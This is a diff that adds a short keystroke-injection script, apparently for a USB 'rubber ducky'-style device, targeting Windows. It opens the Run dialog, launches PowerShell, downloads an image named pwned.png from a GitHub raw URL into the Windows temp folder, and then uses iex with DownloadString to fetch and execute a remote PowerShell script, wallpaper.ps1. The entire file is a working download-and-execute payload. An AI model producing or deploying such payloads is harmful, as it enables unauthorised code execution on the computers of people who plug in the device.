@@ -1,0 +1,13 @@
+DELAY 1000
+REM https://raw.githubusercontent.com/daniel2005d/raspi-samples/refs/heads/main/pwned.png
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+STRING wget https://raw.githubusercontent.com/daniel2005d/raspi-samples/refs/heads/main/pwned.png -outfile c:\windows\temp\wallpaper.png
+ENTER
+DELAY 5000
+STRING iex (new-object net.webclient).DownloadString('https://raw.githubusercontent.com/daniel2005d/raspi-samples/refs/heads/main/wallpaper.ps1')
+ENTER
+LED
